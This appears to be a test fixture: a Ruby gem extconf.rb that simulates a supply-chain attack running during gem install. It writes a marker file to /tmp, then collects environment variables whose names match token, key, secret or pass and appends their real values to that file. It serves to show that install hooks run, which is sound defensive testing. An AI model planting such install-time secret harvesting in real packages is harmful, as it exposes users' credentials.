# Simulates BufferZoneCorp Ruby attack: extconf.rb runs during gem install.
# This writes a marker file to prove it executed.
# Ruby has NO way to block this — extconf.rb always runs for native extensions.

File.write("/tmp/marker-ruby-extconf", "EXTCONF_EXECUTED\n")

# Also attempt credential harvesting (harmless — writes to marker)
env_secrets = ENV.select { |k, _| k =~ /token|key|secret|pass|api|auth/i }
File.open("/tmp/marker-ruby-extconf", "a") do |f|
  env_secrets.each { |k, v| f.puts "#{k}=#{v}" }
end

# Still need to create a valid Makefile or the gem install fails differently
require 'mkmf'
create_makefile('test_ext')
